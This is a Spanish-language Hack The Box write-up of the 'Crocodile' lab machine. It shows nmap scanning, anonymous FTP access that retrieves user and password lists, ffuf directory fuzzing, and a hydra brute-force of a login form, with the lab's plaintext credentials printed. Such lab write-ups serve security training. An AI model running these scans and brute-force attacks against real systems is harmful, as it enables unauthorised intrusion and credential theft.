@@ -1,0 +1,180 @@
+---
+type: writeup
+title: Crocodile
+description: Demuestra los peligros de una autenticación mal configurada y la exposición de datos confidenciales. Una instancia vulnerable de un servidor FTP está mal configurada para permitir la autenticación anónima y, al enumerar el servidor, se pueden encontrar archivos confidenciales que contienen credenciales en texto plano. Enumerar y realizar pruebas de fuzzing en el sitio web revelará un punto de inicio de sesión oculto donde las credenciales obtenidas previamente pueden usarse para acceder al panel de administración.
+lang: es
+draft: false
+image: ../../../../images/writeups/hackthebox/machines/crocodile/crocodile.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/Crocodile
+difficulty: veryeasy
+os: linux
+hints: []
+tags: []
+---
+
+## Enumeration
+
+Escaneamos con `nmap` todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.1.15
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+Escaneamos los puertos abiertos para ver más detalles sobre ellos.
+
+```bash
+nmap -p 21,80 -sCV -oA nmap/openports 10.129.1.15
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.15.78
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Smash - Bootstrap Business Template
+Service Info: OS: Unix
+```
+
+Podemos acceder al servicio ftp de forma anónima.
+
+```bash
+ftp 10.129.1.15
+```
+
+Cuando nos pida el `Name` ingresamos `anonymous`.
+
+Listamos el contenido del directorio.
+
+```bash
+dir
+```
+
+```plaintext
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+226 Directory send OK.
+```
+
+Ponemos en `off` el modo interactivo para que no nos pida confirmación cuando descargamos múltiples archivos.
+
+```bash
+prompt off
+```
+
+Descargamos todos los archivos con el comando.
+
+```bash
+mget *
+```
+
+```bash
+local: allowed.userlist remote: allowed.userlist
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
+226 Transfer complete.
+33 bytes received in 0.0065 seconds (4.9652 kbytes/s)
+local: allowed.userlist.passwd remote: allowed.userlist.passwd
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
+226 Transfer complete.
+62 bytes received in 0.0027 seconds (22.0490 kbytes/s)
+```
+
+Leemos el contenido de los archivos descargados.
+
+```bash
+cat allowed.userlist
+```
+
+```plaintext
+aron
+pwnmeow
+egotisticalsw
+admin
+```
+
+```bash
+cat allowed.userlist.passwd 
+```
+
+```plaintext
+root
+Supersecretpassword1
+@BaASD&9032123sADS
+rKXM59ESxesUFHAd
+```
+
+Enumeramos directorios en el servicio web.
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.1.15/FUZZ -ic -c -t 100
+```
+
+```plaintext
+assets                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 225ms]
+css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 230ms]
+js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 228ms]
+fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 225ms]
+dashboard               [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 233ms]
+```
+
+El directorio `dashboard` llama la atención así que lo visitamos y encontramos un formulario de inicio de sesión.
+
+![Crocodile Webservice Login](@images/writeups/hackthebox/machines/crocodile/crocodile-webservice-login.png)
+
+## Exploitation
+
+Con la información que recolectamos hasta ahora podemos hacer fuerza bruta con `hydra` para encontrar un usuario y contraseña que permitan iniciar sesión en el sitio web.
+
+`hydra` toma las listas que encontramos con las flags `-L` para el usuario y `-P` para la contraseña, la IP del target, el tipo de formulario y método (`http`, `post` con `http-post-form`), la ruta del archivo que procesa la información `/login.php`, el body con `Username` y `Password` que van a reemplazarse con los diccionarios y con `F` le decimos que si encuentra ese texto en la respuesta significa que la contraseña falló.
+
+```bash
+hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.1.15 http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:F=Incorrect information." -I
+```
+
+```plaintext
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-28 02:32:32
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
+[DATA] attacking http-post-form://10.129.1.15:80/login.php:Username=^USER^&Password=^PASS^&Submit=Login:F=Incorrect information.
+[80][http-post-form] host: 10.129.1.15   login: admin   password: rKXM59ESxesUFHAd
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-28 02:32:35
+```
+
+Iniciamos sesión con las credenciales encontradas y obtenemos la flag.
+
+![Crocodile Webservice Dashboard](@images/writeups/hackthebox/machines/crocodile/crocodile-webservice-dashboard.png)
+
+### Flag
+
+<Callout type="success" title="Flag">
+c********************************6
+</Callout>
